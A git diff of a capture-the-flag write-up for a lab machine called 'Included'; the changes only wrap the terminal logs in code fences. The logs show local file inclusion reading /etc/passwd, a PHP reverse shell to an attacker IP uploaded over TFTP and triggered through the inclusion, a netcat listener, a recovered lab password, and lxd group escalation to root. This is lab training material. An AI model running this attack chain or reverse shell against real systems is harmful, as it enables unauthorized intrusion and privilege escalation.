@@ -1,4 +1,5 @@
 1.I notice it is vulnerable to LFI
+```bash
 ┌──(sabeshan㉿kali)-[~]
 └─$ curl http://10.129.151.160/?file=../../../../etc/passwd
 root:x:0:0:root:/root:/bin/bash
@@ -32,8 +33,9 @@ pollinate:x:109:1::/var/cache/pollinate:/bin/false
 mike:x:1000:1000:mike:/home/mike:/bin/bash
 tftp:x:110:113:tftp daemon,,,:/var/lib/tftpboot:/usr/sbin/nologin
 --------------------------------=====----------------------------
+```
 2.Switched to the UDP scan identifed the any open ports. There is open port TFTP and it will allowed to upload remote code files into the system.
-                                                                                                                                                            
+```bash                                                                                                                                                            
 ┌──(sabeshan㉿kali)-[~]
 └─$ head shell_rev.php                                       
 <?php
@@ -46,7 +48,8 @@ $ip = '10.10.16.20';
 $port = 1337;
 $chunk_size = 1400;
 $write_a = null;
-
+```
+```bash
 ┌──(sabeshan㉿kali)-[~]
 └─$ tftp 10.129.151.160                
 tftp> dir
@@ -72,8 +75,9 @@ timeout         set total retransmission timeout
 help            print help information
 tftp> put shell_rev.php
 tftp> quit
+```
 =============================================================================
-
+```bash
 ┌──(sabeshan㉿kali)-[~]
 └─$ curl http://10.129.151.160/?file=/var/lib/tftpboot/shell_rev.php
 
@@ -97,8 +101,10 @@ zsh: suspended  nc -lvnp 1337
 [1]  + continued  nc -lvnp 1337
 
 www-data@included:/$ export TERM=xterm
-www-data@included:/$ 
+www-data@included:/$
+```
 ----------------------------------------------------------------------
+```bash
 www-data@included:/var/www/html$ ls -la
 total 88
 drwxr-xr-x 4 root     root      4096 Oct 13  2021 .
@@ -117,8 +123,10 @@ mike:Sheffield19
 www-data@included:/var/www/html$ 
 mike@included:~$ groups
 mike lxd
-mike@included:~$ 
+mike@included:~$
+```
 --------------------------------------------------------------------------
+```bash
 ww-data@included:/$ su mike
 Password: 
 su: Authentication failure
@@ -223,3 +231,4 @@ root
 ~ # id
 uid=0(root) gid=0(root)
 -------------------------------------------------------------------------------------
+```
